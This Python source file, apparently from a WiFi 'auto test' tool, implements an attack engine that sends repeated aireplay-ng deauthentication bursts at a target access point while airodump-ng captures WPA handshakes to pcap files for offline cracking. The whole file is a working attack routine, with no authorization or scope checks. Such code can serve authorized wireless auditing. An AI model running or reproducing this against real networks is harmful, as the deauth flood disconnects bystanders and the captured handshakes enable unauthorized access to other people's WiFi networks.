import glob
import os
import re
import subprocess
import threading
import time
from datetime import datetime
from typing import Callable, Optional

from wifi_auto_test.config.interfaces import IConfigStore
from wifi_auto_test.core.models import WiFiNetwork, TestResult, TestStatus
from wifi_auto_test.utils.process_runner import ProcessRunner
from .interfaces import IAttackEngine


class AirodumpAttack(IAttackEngine):
    """Fallback attack via airodump-ng + aireplay-ng deauth when hcxdumptool is unavailable."""

    def __init__(
        self,
        interface: str,
        output_dir: str,
        timeout: int,
        process_runner: ProcessRunner,
        logger: Optional[Callable[[str], None]] = None,
    ):
        self._interface = interface
        self._output_dir = output_dir
        self._timeout = timeout
        self._runner = process_runner
        self._log: Callable[[str], None] = logger or (lambda x: None)
        os.makedirs(self._output_dir, exist_ok=True)

    def run(self, network: WiFiNetwork) -> TestResult:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_ssid = re.sub(r"[^\w\-]", "_", network.ssid or "hidden")
        prefix = f"{self._output_dir}/{timestamp}_{safe_ssid}_{network.bssid.replace(':', '')}"

        # Prevent channel -1 (invalid)
        channel = network.channel if network.channel > 0 else 1

        command = [
            "sudo", "airodump-ng",
            "-c", str(channel),
            "--bssid", network.bssid,
            "-w", prefix,
            "--output-format", "pcap",
            "--write-interval", "1",
            "--ignore-negative-one",
            self._interface,
        ]

        status = TestStatus.TIMEOUT
        log_lines: list[str] = []
        handshake_found = False
        pcap_file = None
        deauth_timers: list[threading.Timer] = []

        def _on_stdout(line: str) -> None:
            nonlocal status, handshake_found
            log_lines.append(line)
            # airodump-ng prints "WPA handshake: <BSSID>" when it captures one
            if "WPA handshake:" in line and network.bssid.lower() in line.lower():
                status = TestStatus.SUCCESS
                handshake_found = True
                self._log(f"[+] WPA handshake captured for {network.ssid}: {line.strip()}")
                # Stop airodump-ng early — no need to wait full timeout
                self._runner.terminate()

        def _on_stderr(line: str) -> None:
            log_lines.append(line)
            self._log(f"[!] stderr {network.ssid}: {line.strip()}")

        def _send_deauth() -> None:
            if handshake_found:
                return
            self._log(f"[*] Sending deauth to {network.ssid} ({network.bssid}) to trigger handshake")
            try:
                subprocess.run(
                    ["sudo", "aireplay-ng", "-0", "5", "-a", network.bssid, self._interface],
                    capture_output=True,
                    timeout=20,
                )
            except Exception as e:
                self._log(f"[!] aireplay-ng failed: {e}")
            # Schedule next deauth in 15s if still running
            if not handshake_found:
                t = threading.Timer(15.0, _send_deauth)
                t.start()
                deauth_timers.append(t)

        # Initial deauth after 5s, then repeat every 15s
        initial_timer = threading.Timer(5.0, _send_deauth)
        initial_timer.start()
        deauth_timers.append(initial_timer)

        # Ensure monitor interface is on the target channel
        subprocess.run(
            ["sudo", "iw", "dev", self._interface, "set", "channel", str(channel)],
            capture_output=True,
        )

        self._log(f"[*] Запуск airodump-ng на {network.ssid} (ch {channel}, {network.bssid})")
        rc = self._runner.run(
            command=command,
            timeout=self._timeout,
            on_stdout=_on_stdout,
            on_stderr=_on_stderr,
        )
        for t in deauth_timers:
            t.cancel()

        if rc == -1 and status != TestStatus.SUCCESS:
            status = TestStatus.TIMEOUT
        elif status != TestStatus.SUCCESS:
            status = TestStatus.FAILURE

        # Find the generated pcap file
        pcap_files = glob.glob(prefix + "-*.cap")
        if pcap_files:
            pcap_file = pcap_files[0]
            if os.path.getsize(pcap_file) == 0:
                pcap_file = None

        # Clean up capture files on failure — only keep successful captures
        if status != TestStatus.SUCCESS:
            for f in glob.glob(prefix + "*"):
                try:
                    os.remove(f)
                except OSError:
                    pass
            pcap_file = None

        return TestResult(
            network=network,
            status=status,
            pcap_file=pcap_file,
            captured_frames="WPA_HANDSHAKE" if handshake_found else None,
            log_excerpt="\n".join(log_lines[-50:]),
        )
